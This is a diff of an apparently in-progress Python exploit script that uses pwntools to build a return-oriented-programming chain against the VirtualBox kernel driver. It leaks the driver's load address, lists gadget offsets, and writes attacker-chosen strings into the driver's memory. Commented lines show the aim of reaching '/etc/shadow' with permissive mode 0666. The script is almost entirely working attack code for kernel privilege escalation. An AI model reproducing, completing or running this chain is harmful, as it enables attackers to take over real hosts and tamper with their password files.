@@ -16,9 +16,9 @@ pop rbp; ret;                       VMMR0 + 0x28d
 xor eax,eax; ret;                   VMMR0 + 0x8b8
 '''
 
-def leaked(leaker_start, search_for):
+def leaked(start_leaker, search_for):
     # Get the address from the leak
-    leaker = process(leaker_start + [search_for])
+    leaker = process(start_leaker)
     leak = [l for l in leaker.recv().decode('utf-8').replace('\r', '').split('\n') if 'vboxdrv:' in l and search_for in l]
     if len(leak) < 1:
         return
@@ -41,14 +41,14 @@ def write_4_bytes_to_mem(rop, binary_start, string, string_location):
     '''
     # mov rax, [rdi + 0x2a50]; ret;
     rop.raw(binary_start + 0x0b7470)
+    # rdi
+    rop.raw(string_location - 0x02a50)
+    # pop rdi; ret;
+    rop.raw(binary_start + 0x07b62a)
     # The string
     rop.raw(b'/etc')
     # pop rax; ret;
     rop.raw(binary_start  + 0x01f7bd)
-    # rdi
-    rop.raw(string_location)
-    # pop rdi; ret;
-    rop.raw(binary_start + 0x07b62a)
 
 def build(leak, gadget_file):
     # Load the target binary
@@ -56,33 +56,32 @@ def build(leak, gadget_file):
         binary = ELF.from_bytes(i.read(), vma=leak)
     # Create the ROP stack
     rop = ROP(binary)
+
     # Build a string in the .bss section of the target driver
     # the .bss section starts at the address the driver was loaded
     # We have to adjust because the gadget we have is rdi + 0x2a50
-    # rop.raw(b'/etc/sha')
-    # rop.raw(b'dow\x00')
-    # rop.raw(0666)
+    write_4_bytes_to_mem(rop, leak, '/etc', leak)
 
-    # mov rax, [rdi + 0x2a50]; ret;
-    rop.raw(leak + 0x0b7470)
-    # /etc      4 bytes
-    rop.raw(b'/etc')
-    # pop rax; ret;
-    rop.raw(leak + 0x01f7bd)
-    # rdi - addition to rdi
-    rop.raw(leak - 0x2a50)
-    # pop rdi; ret;
-    rop.raw(leak + 0x07b62a)
-
+    # Display our completed ROP chain
     print(rop.dump())
     return bytes(rop)
 
-def main():
-    leak, leaker = leaked(['./userspace'], sys.argv[1])
+def create_exploit(leak, target_binary, payload_file):
+    exploit = build(leak, target_binary)
+    with open(payload_file, 'wb') as o:
+        o.write(exploit)
+    return exploit
+
+def attack(target_binary, payload_file):
+    leak, leaker = leaked(['./userspace', sys.argv[1], sys.argv[2]], sys.argv[1])
     print('Leaked address is', str(hex(leak)))
-    exploit = build(leak, sys.argv[1])
-    print(enhex(exploit))
+    exploit = create_exploit(leak, target_binary, payload_file)
+    leaker.shutdown('send')
     leaker.shutdown()
+
+def main():
+    create_exploit(int(sys.argv[1], 16), sys.argv[2], sys.argv[3])
+    # attack(sys.argv[1], sys.argv[2])
 
 if __name__ == '__main__':
     main()
